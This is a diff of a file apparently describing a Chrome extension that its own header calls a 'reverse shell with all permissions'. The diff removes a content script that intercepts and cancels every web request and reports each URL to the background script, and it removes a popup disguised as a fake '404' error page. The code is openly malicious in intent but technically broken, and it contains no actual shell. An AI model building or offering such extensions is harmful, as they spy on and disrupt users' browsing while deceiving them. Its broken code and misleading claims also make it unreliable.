@@ -1,4 +1,4 @@
-a Chrome extension for reverse shell with all permissions
+// a Chrome extension for reverse shell with all permissions
 
 {
   "manifest_version": 2,
@@ -45,41 +45,3 @@ a Chrome extension for reverse shell with all permissions
     "default_popup": "popup.html"
   }
 }
-
-
-
-// content.js
-// Hijack all network requests and send them to the background script
-chrome.webRequest.onBeforeRequest.addListener(
-  function(details) {
-    // Get the request URL
-    const url = details.url;
-    
-    // Send the URL to the background script
-    chrome.runtime.sendMessage({ type: "request", url });
-    
-    // Cancel the original request
-    return { cancel: true };
-  },
-  { urls: ["<all_urls>"] },
-  ["blocking"]
-);
-
-// popup.html
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Reverse Shell Extension</title>
-    <script src="popup.js"></script>
-  </head>
-  <body>
-    <h1>Extension</h1>
-    <p>error 404</p>
-  </body>
-</html>
-
-// popup.js
-// No additional code is required for the popup
-
-// icon.png
-// Replace this with your desired icon for the extension
